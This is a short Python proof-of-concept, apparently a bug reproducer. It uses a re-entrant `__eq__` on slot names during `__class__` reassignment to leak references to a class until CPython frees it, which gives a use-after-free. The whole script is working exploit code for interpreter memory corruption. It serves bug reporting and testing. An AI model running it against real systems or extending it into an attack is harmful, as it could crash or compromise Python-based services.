"""Drive the object_set_class `oldto` over-decrement to a real use-after-free.

Each `o.__class__ = B` on an A-typed object costs class A *two* references but
only one is legitimate, so N iterations leak N decrements.  When A's refcount
reaches zero the class object is freed while the module global `A` still names
it -> use-after-free on the next attribute access.
"""
import sys

armed = [False]
target = [None]


class MyStr(str):
    def __eq__(self, other):
        if armed[0]:
            armed[0] = False
            target[0].__class__ = C
        return str.__eq__(self, other)

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return str.__hash__(self)

    def __lt__(self, other):
        return str.__lt__(self, other)


class Base:
    pass


class A(Base):
    __slots__ = (MyStr("x"),)


class B(Base):
    __slots__ = (MyStr("x"),)


class C(Base):
    __slots__ = (MyStr("x"),)


n = int(sys.argv[1]) if len(sys.argv) > 1 else 12
print("A refcount at start:", sys.getrefcount(A), flush=True)
for i in range(n):
    o = A()
    target[0] = o
    armed[0] = True
    o.__class__ = B
    target[0] = None
    print("  iter", i, "A refcount now:", sys.getrefcount(A), flush=True)

print("touching A after the loop ...", flush=True)
print("  A.__name__ =", A.__name__, flush=True)
print("  A() ->", A(), flush=True)
print("NO CRASH", flush=True)
